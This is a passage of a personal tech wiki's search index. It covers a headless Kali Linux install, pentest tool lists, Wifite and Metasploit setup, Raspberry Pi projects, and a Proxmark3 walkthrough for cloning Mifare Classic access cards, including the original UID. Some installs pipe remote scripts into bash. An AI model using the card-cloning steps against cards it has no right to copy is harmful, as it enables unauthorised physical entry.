Headless Kali Linux installation - Works for Cloud VM Installation (NO GUI)", "text": "<p>This is a simple guide to install Minimal Headless Kali Linux by converting a Debian Linux to Kali Linux distro without any unnecessary tools. Basically you install the tools you need.</p> Platforms Minimum Monthly Price DigitalOcean.com 5$ (This link provides 100$ for 60 days) <p>First of all we will need a clean Debian Linux local or at any cloud provider with ssh access</p> <p>Let's convert! We will install two packages which allow as to replace Debian's repo to kali repo</p> <pre><code>apt update\n</code></pre> <pre><code>apt install -y gnupg gnupg2 wget\n</code></pre> <pre><code>wget -q -O - https://archive.kali.org/archive-key.asc  | apt-key add\n</code></pre> <pre><code>rm -rf /etc/apt/sources.list\n</code></pre> <pre><code>echo \"deb http://http.kali.org/kali kali-rolling main contrib non-free\" &gt;&gt; /etc/apt/sources.list\n</code></pre> <p>Now after we replaced the repo to Kali we need to install the Basic Kali Linux core</p> <pre><code>apt -y update\n</code></pre> <pre><code>apt-cache search kali-linux\n</code></pre> <pre><code>apt install -y kali-linux-core\n</code></pre> <pre><code>apt-get -y update\n</code></pre> <pre><code>apt-get -y dist-upgrade\n</code></pre> <pre><code>apt-get -y autoremove\n</code></pre> <p>Reboot the server to complete the conversion process.</p> <p>In order to test that you are using Kali Linux</p> <p><pre><code>uname -a\n</code></pre> Or you can check the contents of the <code>/etc/os-release</code> file for this Debian distribution.</p> <p>After we got our new Minimal Kali ready we need to cleanup some Debian's leftovers to finnish</p> <pre><code>systemctl stop rpcbind.socket rpcbind smbd\n</code></pre> <pre><code>systemctl disable rpcbind.socket rpcbind smbd\n</code></pre> <p>That's It, now we can install any package we need from Kali repo.</p> <p>Here are some of my personal packages I use daily</p> <pre><code>apt update &amp;&amp; apt install -y \\\ncurl wget git dnsutils whois net-tools htop locate telnet traceroute \\\ndirb wfuzz dirbuster enum4linux gobuster nbtscan nikto nmap \\\nonesixtyone oscanner smbclient fern-wifi-cracker crowbar smbmap \\\nsmtp-user-enum sslscan tnscmd10g whatweb snmpcheck wkhtmltopdf \\\nsipvicious seclists wordlists hydra bully netcat-openbsd netcat-traditional \\\nadb fastboot realtek-rtl88xxau-dkms docker docker-compose crunch \\\nwifite apktool apksigner zipalign default-jre default-jdk man-db \\\nscreenfetch xsltproc binwalk python3-pip zlib1g-dev python2.7-dev \\\nsubfinder chrony hcxtools libssl-dev hcxdumptool hashcat hash-identifier \\\nlibpcap-dev npm sqlmap wpscan exploitdb minicom screen hashid nfs-common\n</code></pre>", "tags": ["penetration-testing", "kali-linux", "kali"]}, {"location": "penetration-testing/kali-linux/kali-linux/#fix-ssh-broken-pipe-in-kali", "title": "Fix SSH Broken Pipe in Kali", "text": "<pre><code>nano ~/.ssh/config\n</code></pre> <p>add this:</p> <pre><code>Host *\n    IPQoS=throughput\n</code></pre>", "tags": ["penetration-testing", "kali-linux", "kali"]}, {"location": "penetration-testing/kali-linux/links/", "title": "Links for Penetration Testing Tools", "text": "", "tags": ["pt", "tools"]}, {"location": "penetration-testing/kali-linux/links/#usefully-tools-for-pentesters", "title": "Usefully Tools for Pentesters", "text": "Links Description Eicar Files Files With Virus Signature Credit Card Generator PayPal Credit Card Generator - Login Required ipleak.net Displays Information About Your IP mxtoolbox Network Tools Related to DNS jwt.io Allows You to Decode, Verify and Generate Json Web Tokens DNS Dumpster Domain Research Tool That Can Discover Hosts Related to a Domain SSL-Lab Deep Analysis of The Configuration of any SSL Web Server GraphQLmap Engine to interact with a graphqlr endpoint for penetration-testing purposes.", "tags": ["pt", "tools"]}, {"location": "penetration-testing/kali-linux/metasploit/", "title": "Metasploit Framework", "text": "", "tags": ["pt", "tools", "metasploit"]}, {"location": "penetration-testing/kali-linux/metasploit/#installation", "title": "Installation", "text": "<pre><code>apt install -y metasploit-framework postgresql\n</code></pre> <pre><code>systemctl enable postgresql\n</code></pre> <pre><code>systemctl start postgresql\n</code></pre> <pre><code>msfdb init\n</code></pre> <p>Start:</p> <pre><code>msfconsole\n</code></pre>", "tags": ["pt", "tools", "metasploit"]}, {"location": "penetration-testing/kali-linux/wifite/", "title": "Wifite", "text": "<p>Wifite is an automated wireless attack tool.</p> <p>Wifite2 Github page</p> <p>In order to perform wifi attacks you need a wifi card with <code>Monitor Mode</code> and <code>Frame Injection</code> like Realtek rtl8812au chipset.</p> <p>Suggested Wifi Dongles</p> <ul> <li>Alfa AWUS036ACH</li> <li>Alfa AC1900</li> <li>1200Mbps USB WiFi Adapter</li> <li>Alfa AWUS036ACS</li> </ul>", "tags": ["pt", "tools", "wifi"]}, {"location": "penetration-testing/kali-linux/wifite/#install-in-kali", "title": "Install in kali", "text": "<pre><code>apt install wifite\n</code></pre>", "tags": ["pt", "tools", "wifi"]}, {"location": "penetration-testing/kali-linux/wifite/#install-pyrit-for-wifite", "title": "Install Pyrit for Wifite", "text": "<p>Pyrit Github page</p> <p>Install dependencies</p> <pre><code>apt install python zlib openssl git\n</code></pre> <p>The Install</p> <pre><code>cd ~\ngit clone https://github.com/JPaulMora/Pyrit.git;\npip install psycopg2 scapy;\ncd Pyrit\npython setup.py clean;\npython setup.py build;\npython setup.py install;\nrm -rf ~/Pyrit\n</code></pre>", "tags": ["pt", "tools", "wifi"]}, {"location": "penetration-testing/proxmark/about-proxmark/", "title": "About Proxmark3", "text": "<p>The Proxmark is an RFID swiss-army tool, allowing for both high and low level interactions with the vast majority of RFID tags and systems world-wide.</p> <p>There are few Promark Devices, and you can find them at the offical website. I personally use the device at the picture above, you can get one at</p> <ul> <li>Proxmark3 - Amazon</li> <li>Proxmark3 - Aliexpress</li> </ul> <p>it's cheap and suites my needs</p> <p>The RFID tags i use are duel band tags 13.56Mhz and 125KHz</p> <ul> <li>RFID tags - Amazon</li> <li>RFID tags - Aliexpress</li> </ul> <p>Useful Links:</p> <ul> <li>Official Proxmark Website</li> <li>Official Proxmark3 Github Repo</li> <li>Andprox - Android client</li> </ul>", "tags": ["pt", "tools", "rfid"]}, {"location": "penetration-testing/proxmark/cheatsheet/", "title": "Proxmark3 CheatSheet", "text": "", "tags": ["pt", "tools", "rfid"]}, {"location": "penetration-testing/proxmark/cheatsheet/#basics", "title": "Basics", "text": "Command Description hf search Identify High Frequency cards lf search Identify Low Frequency cards hw tune Measure antenna characteristics, LF/HF voltage should be around 20-45+ V hw version Check version hw status Check overall status", "tags": ["pt", "tools", "rfid"]}, {"location": "penetration-testing/proxmark/mifare-tags/", "title": "Clone Mifare Classic 1K ISO14443A", "text": "", "tags": ["pt", "tools", "rfid"]}, {"location": "penetration-testing/proxmark/mifare-tags/#read-mifare-iso14443a-basic-information", "title": "Read Mifare ISO14443A Basic Information", "text": "<pre><code>proxmark3&gt; hf search\n</code></pre> <p>Which results in a response along the lines of:</p> <pre><code> #db# DownloadFPGA(len: 42096)\n UID : de 0f 3d cd\nATQA : 00 04\n SAK : 08 [2]\nTYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1\nproprietary non iso14443-4 card found, RATS not supported\nNo chinese magic backdoor command detected\nPrng detection: HARDENED (hardnested)\nValid ISO14443A Tag Found - Quiting Search\n</code></pre> <p>As we can see the output <code>ISO14443A Tag Found</code> it's <code>Mifare 1k</code> card.</p> <p>This also shows us the UID <code>de0f3dcd</code> of the card, which we\u2019ll need later.</p>", "tags": ["pt", "tools", "rfid"]}, {"location": "penetration-testing/proxmark/mifare-tags/#find-and-extract-the-32-keys-from-the-mifare-iso14443a", "title": "Find and Extract the 32 Keys From The Mifare ISO14443A", "text": "<p>From there we can find keys in use by checking against a list of default keys (hopefully one of these has been used)</p> <pre><code>proxmark3&gt; hf mf chk * ?\n</code></pre> <p>This should show us the key we require looking something like</p> <pre><code>No key specified, trying default keys\nchk default key[ 0] ffffffffffff\nchk default key[ 1] 000000000000\nchk default key[ 2] a0a1a2a3a4a5\nchk default key[ 3] b0b1b2b3b4b5\nchk default key[ 4] aabbccddeeff\nchk default key[ 5] 4d3a99c351dd\nchk default key[ 6] 1a982c7e459a\nchk default key[ 7] d3f7d3f7d3f7\nchk default key[ 8] 714c5c886e97\nchk default key[ 9] 587ee5f9350f\nchk default key[10] a0478cc39091\nchk default key[11] 533cb6c723f6\nchk default key[12] 8fd0a4f256e9\n--sector: 0, block:  3, key type:A, key count:13\nFound valid key:[ffffffffffff]\n...omitted for brevity...\n--sector:15, block: 63, key type:B, key count:13\nFound valid key:[ffffffffffff]\n</code></pre> <p>If you see Found valid key:[ffffffffffff]</p> <p>This shows a key of <code>ffffffffffff</code>, which we can plug into the next command, which dumps keys to file <code>dumpkeys.bin</code>.</p> <pre><code>proxmark3&gt; hf mf nested 1 0 A ffffffffffff d\n</code></pre> <p>If you see see an a table like this in output without <code>valid key</code></p> <pre><code>|---|----------------|---|----------------|---|\n|sec|key A           |res|key B           |res|\n|---|----------------|---|----------------|---|\n|000|  a0a1a2a3a4a5  | 1 |  ffffffffffff  | 0 |\n|001|  ffffffffffff  | 0 |  ffffffffffff  | 0 |\n|002|  a0a1a2a3a4a5  | 1 |  ffffffffffff  | 0 |\n|003|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|004|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|005|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|006|  ffffffffffff  | 1 |  ffffffffffff  | 0 |\n|007|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|008|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|009|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|010|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|011|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|012|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|013|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|014|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|015|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|---|----------------|---|----------------|---|\n</code></pre> <p>In this case use <code>002</code> key like this</p> <pre><code>proxmark3&gt; hf mf nested 1 0 A a0a1a2a3a4a5 d\n</code></pre> <p>Now you should be able to dump the contents of the 32 keys from the original card. This dumps data from the card into <code>dumpdata.bin</code></p> <pre><code>proxmark3&gt; hf mf dump\n</code></pre>", "tags": ["pt", "tools", "rfid"]}, {"location": "penetration-testing/proxmark/mifare-tags/#clone-mifare-iso14443a-using-the-dumped-keys", "title": "Clone Mifare ISO14443A Using The Dumped Keys", "text": "<p>At this point we\u2019ve got everything we need from the card, we can take it off the reader.</p> <p>To copy that data onto a new card, place the (Chinese backdoor) card on the Proxmark.</p> <p>This restores the dumped data onto the new card. Now we just need to give the card the UID we got from the original hf search command</p> <pre><code>proxmark3&gt; hf mf restore 1\n</code></pre> <p>Copy the UID of the original card <code>de0f3dcd</code></p> <pre><code>proxmark3&gt; hf mf csetuid de0f3dcd\n</code></pre> <p>We\u2019re done.</p>", "tags": ["pt", "tools", "rfid"]}, {"location": "penetration-testing/utilities/clickjacking/", "title": "Clickjacking Test Page", "text": "<p> Full Screen Version </p>", "tags": ["pt", "tools", "clickjacking"]}, {"location": "penetration-testing/utilities/idd-generator/", "title": "IID Generator &amp; Validator", "text": "", "tags": ["pt", "tools", "IID"]}, {"location": "penetration-testing/utilities/idd-generator/#description", "title": "Description", "text": "<p>This is a simple Java Script tool to validate or generate a random Israel's ID number.</p>", "tags": ["pt", "tools", "IID"]}, {"location": "penetration-testing/utilities/idd-generator/#credit-sources", "title": "Credit &amp; Sources", "text": "<p>The code was built by Georgy Bunin and cloned from his repository. It was slightly modified to fit this website.</p>", "tags": ["pt", "tools", "IID"]}, {"location": "raspberry-pi/docker-raspberrypi/", "title": "Docker and Docker-compose on Raspberry Pi", "text": "", "tags": ["docker", "raspberry-pi", "docker-compose"]}, {"location": "raspberry-pi/docker-raspberrypi/#how-to-install-docker-on-raspberry-pi", "title": "How to install docker on Raspberry Pi", "text": "<pre><code>sudo apt install -y docker.io\n</code></pre>", "tags": ["docker", "raspberry-pi", "docker-compose"]}, {"location": "raspberry-pi/docker-raspberrypi/#runing-docker-as-root", "title": "Runing Docker as root", "text": "<pre><code>sudo usermod -aG docker pi\n</code></pre>", "tags": ["docker", "raspberry-pi", "docker-compose"]}, {"location": "raspberry-pi/docker-raspberrypi/#manage-docker-as-a-non-root-user", "title": "Manage Docker as a non-root user", "text": "<p>The Docker daemon binds to a Unix socket instead of a TCP port. By default that Unix socket is owned by the user root and other users can only access it using sudo. The Docker daemon always runs as the root user.</p> <p>If you don\u2019t want to preface the docker command with sudo, create a Unix group called docker and add users to it. When the Docker daemon starts, it creates a Unix socket accessible by members of the docker group.</p> <p>Warning</p> <p>The docker group grants privileges equivalent to the root user.</p> <pre><code>sudo groupadd docker\nsudo usermod -aG docker $USER\nnewgrp docker\n</code></pre>", "tags": ["docker", "raspberry-pi", "docker-compose"]}, {"location": "raspberry-pi/docker-raspberrypi/#how-to-install-docker-compose-on-raspberry-pi", "title": "How to install docker-compose on Raspberry Pi", "text": "<pre><code>sudo apt install docker-compose\n</code></pre>", "tags": ["docker", "raspberry-pi", "docker-compose"]}, {"location": "raspberry-pi/external-power-button/", "title": "External Power Button For Raspberry Pi", "text": "<p>Python script to control Raspberry Pi with external power button - Wake/Power Off/Restart(Double Press)</p> <p>Official Github Repo</p>", "tags": ["raspberry-pi"]}, {"location": "raspberry-pi/external-power-button/#raspberry-pi-power-button-wakepower-offrestartdouble-press", "title": "Raspberry Pi Power Button - Wake/Power Off/Restart(Double Press)", "text": "", "tags": ["raspberry-pi"]}, {"location": "raspberry-pi/external-power-button/#information", "title": "Information", "text": "<p>When Raspberry Pi is powered off, shortening GPIO3 (Pin 5) to ground will wake the Raspberry Pi.</p> <p>This script uses pin GPIO3(5), Ground(6) with momentary button.</p> <p></p> <p></p>", "tags": ["raspberry-pi"]}, {"location": "raspberry-pi/external-power-button/#requirements", "title": "Requirements", "text": "<ul> <li>python3-gpiozero</li> </ul> <p>Can be install via apt</p> <pre><code>sudo apt install python3-gpiozero\n</code></pre>", "tags": ["raspberry-pi"]}, {"location": "raspberry-pi/external-power-button/#install", "title": "Install", "text": "<p>This will install the script as <code>service</code> and it will run at boot</p> <pre><code>curl https://raw.githubusercontent.com/fire1ce/raspberry-pi-power-button/main/install.sh | bash\n</code></pre>", "tags": ["raspberry-pi"]}, {"location": "raspberry-pi/external-power-button/#uninstall", "title": "Uninstall", "text": "<pre><code>curl https://raw.githubusercontent.com/fire1ce/raspberry-pi-power-button/main/uninstall.sh | bash\n</code></pre>", "tags": ["raspberry-pi"]}, {"location": "raspberry-pi/external-power-button/#default-behavior", "title": "Default Behavior", "text": "Button Press (Raspberry Pi is ON) Behavior Single Nothing Double Reboot Long press and releases (above 3 seconds) Power off Button Press (Raspberry Pi is OFF) Behavior Single Power On", "tags": ["raspberry-pi"]}, {"location": "raspberry-pi/external-power-button/#check-if-service-is-running", "title": "Check if service is running", "text": "<pre><code>sudo systemctl status power_button.service\n</code></pre>", "tags": ["raspberry-pi"]}, {"location": "raspberry-pi/motion-sensor-display-control/", "title": "Motion Sensor Display Control", "text": "<p>Python script to control connected display to Raspberry Pi using Motion Sensor (pir).</p> <p>Official Github Repo</p>", "tags": ["raspberry-pi", "motion-sensor", "automation"]}, {"location": "raspberry-pi/motion-sensor-display-control/#information", "title": "Information", "text": "<p>This script uses pin GPIO4(7) to read data from Motion (PIR) Sensor, Any 5v and ground for PIR Sensor</p> <p></p> <p></p>", "tags": ["raspberry-pi", "motion-sensor", "automation"]}, {"location": "raspberry-pi/motion-sensor-display-control/#requirements", "title": "Requirements", "text": "<ul> <li>python3-gpiozero</li> </ul> <p>Can be install via apt</p> <pre><code>sudo apt install python3-gpiozero\n</code></pre>", "tags": ["raspberry-pi", "motion-sensor", "automation"]}, {"location": "raspberry-pi/motion-sensor-display-control/#install", "title": "Install", "text": "<p>This will install the script as <code>service</code> and it will run at boot</p> <pre><code>curl https://raw.githubusercontent.com/fire1ce/raspberry-pi-pir-motion-display-control/main/install.sh | bash\n</code></pre>", "tags": ["raspberry-pi", "motion-sensor", "automation"]}, {"location": "raspberry-pi/motion-sensor-display-control/#uninstall", "title": "Uninstall", "text": "<pre><code>curl https://raw.githubusercontent.com/fire1ce/raspberry-pi-pir-motion-display-control/main/uninstall.sh | bash\n</code></pre>", "tags": ["raspberry-pi", "motion-sensor", "automation"]}, {"location": "raspberry-pi/motion-sensor-display-control/#default-behavior", "title": "Default Behavior", "text": "Condition Behavior Motion while display is off Turns on display for 60 sec Motion while display is on Resets the timer for another 60 sec No motion &gt; 60 sec Turns off the display", "tags": ["raspberry-pi", "motion-sensor", "automation"]}, {"location": "raspberry-pi/motion-sensor-display-control/#config", "title": "Config", "text": "<p>File</p> <pre><code>/usr/local/bin/motion-display-control.py\n</code></pre> <p>You can change Data Pin of the PIR Sensor at gpio_pin value You can change Delay at display_delay value</p> <p>Line</p> <pre><code>motion = Motion(gpio_pin=4, display_delay=60, verbose=False)\n</code></pre> <p>Restart the service to apply changes</p> <pre><code>sudo systemctl restart power_button.service\n</code></pre>", "tags": ["raspberry-pi", "motion-sensor", "automation"]}, {"location": "raspberry-pi/motion-sensor-display-control/#debug", "title": "Debug", "text": "<p>In order to allow verbose debug change the following</p> <p>File</p> <pre><code>/usr/local/bin/motion-display-control.py\n</code></pre> <p>Line</p> <p>Set verbose value to True</p> <pre><code>motion = Motion(gpio_pin=4, display_delay=60, verbose=True)\n</code></pre> <p>Restart the service to apply changes</p> <pre><code>sudo systemctl restart motion-display-control.service\n</code></pre>", "tags": ["raspberry-pi", "motion-sensor", "automation"]}, {"location": "raspberry-pi/motion-sensor-display-control/#check-if-service-is-running", "title": "Check if service is running", "text": "<pre><code>sudo systemctl status motion-display-control.service\n</code></pre>", "tags": ["raspberry-pi", "motion-sensor", "automation"]}, {"location": "raspberry-pi/motion-sensor-display-control/#contributors", "title": "Contributors", "text": "<p>Thanks to Boris Berman  for the script rewrite from function to classes</p>", "tags": ["raspberry-pi", "motion-sensor", "automation"]}, {"location": "raspberry-pi/snippets/", "title": "Snippets", "text": "", "tags": ["raspberry-pi"]}, {"location": "raspberry-pi/snippets/#enable-ssh-on-raspberry-pi-without-a-screen", "title": "Enable SSH on Raspberry Pi Without a Screen", "text": "<p>Put the micro SD card into your computer You'll have to locate the boot directory at your SD card</p> <p>for example:</p> <pre><code>cd /Volumes/boot\n</code></pre> <p>All you have to do is create an empty file called ssh.</p> <pre><code>touch ssh\n</code></pre> <p>That's it. Insert the SD card to the Pi. You should have enabled SSH at boot.</p>", "tags": ["raspberry-pi"]}, {"location": "raspberry-pi/snippets/#default-user-and-password-after-installation", "title": "Default User and Password After Installation", "text": "<pre><code>User: pi\nPassword: raspberry\n</code></pre>", "tags": ["raspberry-pi"]}, {"location": "raspberry-pi/snippets/#basic-configuration", "title": "Basic Configuration", "text": "<pre><code>sudo raspi-config\n</code></pre>", "tags": ["raspberry-pi"]}, {"location": "raspberry-pi/snippets/#update-os", "title": "Update OS", "text": "<pre><code>sudo apt-get update &amp;&amp; sudo apt-get upgrade -y\n</code></pre>", "tags": ["raspberry-pi"]}, {"location": "raspberry-pi/snippets/#disable-ipv6-on-raspberry-pi-os", "title": "Disable IPv6 on Raspberry Pi Os", "text": "<p>Edit \u201c/etc/sysctl.conf\u201d:</p> <pre><code>sudo nano /etc/sysctl.conf\n</code></pre> <p>Add this to the end:</p> <pre><code>net.ipv6.conf.all.disable_ipv6=1\nnet.ipv6.conf.default.disable_ipv6=1\nnet.ipv6.conf.lo.disable_ipv6=1\nnet.ipv6.conf.eth0.disable_ipv6 = 1\n</code></pre> <p>Save and close the file. Edit \u201c/etc/rc.local\u201d:</p> <pre><code>sudo nano /etc/rc.local\n</code></pre> <p>Add this to the end (but before \u201cexit 0\u201d):</p> <pre><code>systemctl restart procps\n</code></pre> <p>Save and close the file. Reboot</p>", "tags": ["raspberry-pi"]}, {"location": "raspberry-pi/snippets/#show-raspberry-temperature", "title": "Show Raspberry Temperature", "text": "<pre><code>/opt/vc/bin/vcgencmd measure_temp\n</code></pre>", "tags": ["raspberry-pi"]}, {"location": "raspberry-pi/snippets/#samba-for-raspberrypi", "title": "Samba for RaspberryPi", "text": "<pre><code>sudo apt-get update\nsudo apt-get install -y samba samba-common-bin smbclient cifs-utils\nsudo smbpasswd -a pi ( my-pi-samba-remote-password )\nsudo nano /etc/samba/smb.conf\n</code></pre> <p>change:</p> <pre><code>workgroup = YOUR WINDOWS WORKGROUP NAME\n</code></pre> <p>add at end:</p> <pre><code>[share]\n    path = /home/pi/Desktop/share\n    available = yes\n    valid users = pi\n    read only = no\n    browsable = yes\n    public = yes\n    writable = yes\n</code></pre> <p><code>the shared path must exist: ( if you work via desktop ( HDMI or VNC ) it is very convenient just to read or drop from/to this shared dir ) mkdir /home/pi/Desktop/share</code></p> <pre><code>sudo reboot\n</code></pre> <p>Start samba Server</p> <pre><code>sudo /usr/sbin/service smbd start\n</code></pre>", "tags": ["raspberry-pi"]}, {"location": "raspberry-pi/guides/3g-modem-host/", "title": "3g Modem Host Configuration", "text": "<p>Install ubuntu server for raspberrypi using Raspberry Pi Imager}{</p>", "tags": ["raspberry-pi", "3g-modem"]}, {"location": "raspberry-pi/guides/3g-modem-host/#packages-installation", "title": "Packages Installation", "text": "<pre><code>apt install -y ppp curl wget git dnsutils whois net-tools htop gcc libusb-1.0-0-dev iptables-persistent isc-dhcp-server\n</code></pre> <p>After the install add a symlink</p> <pre><code>ln -s /usr/include/libusb-1.0/libusb.h /usr/include/libusb.h\n</code></pre>", "tags": ["raspberry-pi", "3g-modem"]}, {"location": "raspberry-pi/guides/3g-modem-host/#sakis3g-script-installation", "title": "sakis3g Script Installation", "text": "<p>Clone, Compile, and copy to /usr/bin/</p> <pre><code>git clone https://github.com/Trixarian/sakis3g-source.git\ncd sakis3g-source\n./compile\ncp build/sakis3gz /usr/bin/sakis3g\n</code></pre> <p>Create new script for auto connect</p> <pre><code>nano /usr/bin/sakis3gConnect.sh\n</code></pre> <p>Note</p> <p>interactive connect (for testing) <code>bash sakis3g --interactive</code></p> <p>Copy the following</p> <pre><code>#!/bin/bash\n\n/usr/bin/sakis3g start USBINTERFACE=\"5\" APN=\"vob3g\"  APN_USER=\" \" APN_PASS=\" \"\n</code></pre> <p>Note</p> <p>When APN credentials are epmpy, APN_USER and APN_PASS should be a string with a space</p> <p>Add executable permissions</p> <pre><code>chmod +x sakis3gConnect.sh\n</code></pre> <p>Run the script sakis3gConnect.sh</p> <p>You should have a new interface ppp0</p>", "tags": ["raspberry-pi", "3g-modem"]}, {"location": "raspberry-pi/guides/3g-modem-host/#configuring-dhcp-server", "title": "Configuring DHCP Server", "text": "<p>!! info The following configuration assumes use of eth0 interface for the DHCP</p> <p>Edit</p> <pre><code>nano /etc/default/isc-dhcp-server\n</code></pre> <p>Add the following to the end of the config</p> <pre><code>INTERFACESv4=\"eth0\"\nINTERFACESv6=\"eth0\"\n</code></pre> <p>Edit</p> <pre><code>nano /etc/dhcp/dhcpd.conf\n</code></pre> <p>Change the following options to (you can choose the name servers you use):</p> <pre><code>option domain-name \"local\";\noption domain-name-servers 8.8.8.8;\ndefault-lease-time 600;\nmax-lease-time 7200;\nddns-update-style none;\nauthoritative;\n</code></pre> <p>Append the DHCP Network config to the end of the file (Change for your need):</p> <pre><code>subnet 192.168.20.0 netmask 255.255.255.0 {\n  range 192.168.20.5 192.168.20.30;\n  option routers 192.168.20.1;\n  option domain-name-servers 8.8.8.8, 8.8.4.4;\n}\n</code></pre> <p>Save &amp; Exit</p> <p>run</p> <pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward\n</code></pre> <p>Edit</p> <pre><code>nano /etc/sysctl.conf\n</code></pre> <p>Change the following option</p> <pre><code>net.ipv4.ip_forward=1\n</code></pre> <p>Restart and Test</p> <pre><code>service isc-dhcp-server restart\nservice isc-dhcp-server status\n</code></pre>", "tags": ["raspberry-pi", "3g-modem"]}, {"location": "raspberry-pi/guides/3g-modem-host/#configure-static-ip-for-the-th0-interface-dhcp", "title": "Configure static ip for the th0 Interface &amp; DHCP", "text": "<p>edit:</p> <pre><code>/etc/netplan/50-cloud-init.yaml\n</code></pre> <pre><code>network:\n  ethernets:\n      eth0:\n            addresses: [192.168.20.1/24]\n            gateway4: 192.168.20.1\n            nameservers:\n                    addresses: [1.1.1.1, 8.8.8.8]\n  version: 2\n</code></pre> <p>After reboot you should connet to the new static ip</p>", "tags": ["raspberry-pi", "3g-modem"]}, {"location": "raspberry-pi/guides/3g-modem-host/#lets-route-all-the-trafic-to-new-interface-with-iptables", "title": "Lets route all the trafic to new interface with Iptables", "text": "<pre><code>iptables -F\niptables --table nat --append POSTROUTING --out-interface ppp0 -j MASQUERADE\niptables --append FORWARD --in-interface eth0 -j ACCEPT\n</code></pre> <p>Save the rules</p> <pre><code>iptables-save &gt; /etc/iptables/rules.v4\nip6tables-save &gt; /etc/iptables/rules.v6\n</code></pre>", "tags": ["raspberry-pi", "3g-modem"]}, {"location": "raspberry-pi/guides/3g-modem-host/#cron-examples", "title": "Cron examples", "text": "<pre><code>@reboot sleep 20 &amp;&amp; /usr/bin/sakis3gConnect.sh\n*/5 * * * * /usr/bin/sakis3gConnect.sh\n</code></pre>", "tags": ["raspberry-pi", "3g-modem"]}, {"location": "raspberry-pi/projects/magic-mirror-v2/", "title": "Magic Mirror 2.0", "text": "<p>To be honest, it's not my first time building a Magic Mirror project. My first magicmirror can be found here. The Magic Mirror 2.0 is based on Raspberry Pi 4 with Docker Container.</p>", "tags": ["raspberry-pi", "magicmirror"]}, {"location": "raspberry-pi/projects/magic-mirror-v2/#references", "title": "References", "text": "<p>magicmirror.builders official website. khassel's magicmirror docker image documentation website.</p>", "tags": ["raspberry-pi", "magicmirror"]}, {"location": "raspberry-pi/projects/magic-mirror-v2/#the-build-process", "title": "The Build Process", "text": "<p>I had dead iMac 2011 27\" with 2k display. I've managed to use it's LCD panel with this product from AliExpress. It actually a full controller for the specific LCD panel, including the inverter for backlight. Basically, it's a full-fledged LCD Monitor with HDMI we need for the Raspberry Pi 4.</p> <p>I've decided to test the controller for the LCD Panel inside the original iMac's body.</p> <p></p> <p>I've connected raspberry to the new monitor for the magicmirror testing and configuration.</p> <p></p> <p>Since my previous experience with my first magicmirror build, I've decided to add a Motion Sensor to the Raspberry Pi to detect the movement of the person infront of the mirror and turn the display on/off accordingly. The second thing i've added is a Power Button to turn the Raspberry Pi on, off and restart it without a physical access to the Raspberry Pi.</p> <p>I couldn't find any open source projects for the functionality I needed of the power button and the Motion Sensor. So I've decided to create my own solution. Bellow are the scripts that I've created:</p> <ul> <li>External Power Button Wake/Power Off/Restart</li> <li>Motion Sensor Display Control</li> </ul> <p>Thats how i've tested the functionality of the power button and the motion sensor.</p> <p></p> <p>I've order a reflective glass with 4 holes for mounting. It was a challenge to find a suitable reflective glass for the MagicMirror. The product I've found is not perfect - the glass is tinted, but it's a good enough solution and way better then Glass Mirror Films I've used on my first Magic Mirror Project.</p> <p></p> <p>After I've done all the <code>proof of concepts</code> that every thing will work as i intended, I've continue to build the frame to house all the components.</p> <p>I've used scrap wood I had laying around to build the frame and the mounting for the LCD panel, and the glass</p> <p></p> <p>For mounting the Magic Mirror to the wall i've used the smallest TV Mount I've found.</p> <p></p> <p>After the frame is built, I've added the electronics to the frame.</p> <p></p> <p>Performing senity check on the electronics, and display assembly.</p> <p></p> <p>Since I when on the <code>floating</code> effect the glass isn't covering the all the frame, all the exposed parts of the glass are needed to be covered to avoid light leaking.</p> <p></p> <p>And the final Magic Mirror on the wall.</p> <p></p> <p></p>", "tags": ["raspberry-pi", "magicmirror"]}, {"location": "raspberry-pi/projects/magic-mirror-v2/#the-software", "title": "The Software", "text": "<p>The magicmiror is based on MagicMirror project. running on docker on Raspberry OS.</p> <p>Below the docker compose file for your reference.</p> <pre><code>version: '3'\n\nservices:\n  magicmirror:\n    image: karsten13/magicmirror\n    container_name: magicmirror\n    hostname: magicmirror\n    restart: always\n    ports:\n      - 80:8080\n    volumes:\n      - ./config:/opt/magic_mirror/config\n      - ./modules:/opt/magic_mirror/modules\n      - ./css:/opt/magic_mirror/css\n      - /tmp/.X11-unix:/tmp/.X11-unix\n      - /opt/vc:/opt/vc/:ro\n      - /sys:/sys\n      - /usr/bin/vcgencmd:/usr/bin/vcgencmd\n      - /etc/localtime:/etc/localtime\n    devices:\n      - /dev/vchiq\n    environment:\n      - LD_LIBRARY_PATH=/opt/vc/lib\n      - DISPLAY=unix:0.0\n      - TZ=Asia/Jerusalem\n      - SET_CONTAINER_TIMEZONE=true\n      - CONTAINER_TIMEZONE=Asia/Jerusalem\n    shm_size: '1024mb'\n    command:\n      - npm\n      - run\n      - start\n</code></pre>", "tags": ["raspberry-pi", "magicmirror"]}, {"location": "raspberry-pi/projects/magic-mirror/", "title": "Magic Mirror", "text": "", "tags": ["raspberry-pi", "magic-mirror"]}, {"location": "raspberry-pi/projects/magic-mirror/#magic-mirror-build-pictures", "title": "Magic Mirror Build Pictures", "text": "<p>23\" Samsung screen power resoldering:</p> <p>Wooden frame initial fitting test on a glass with duel mirror film applied:</p> <p>Testing the screen installation (frame removed) with power cords:</p> <p>Testing black&amp;white picture from a laptop after frame assembly:</p> <p>Power, Lan, Usb external ports cutouts:</p> <p>Fitted extended ports with wood filler:</p> <p>Extended ports:</p> <p>Assembly With screen, Raspberry Pi, cable routing, black material which do not pass light where there is no screen:</p> <p>Adding some color for the frame:</p> <p>Testing everything is working as it should be:</p> <p>Full assembly behind the mirror:</p> <p>Final Product:</p>", "tags": ["raspberry-pi", "magic-mirror"]}, {"location": "raspberry-pi/projects/magic-mirror/#configuration-setup", "title": "Configuration Setup", "text": "", "tags": ["raspberry-pi", "magic-mirror"]}, {"location": 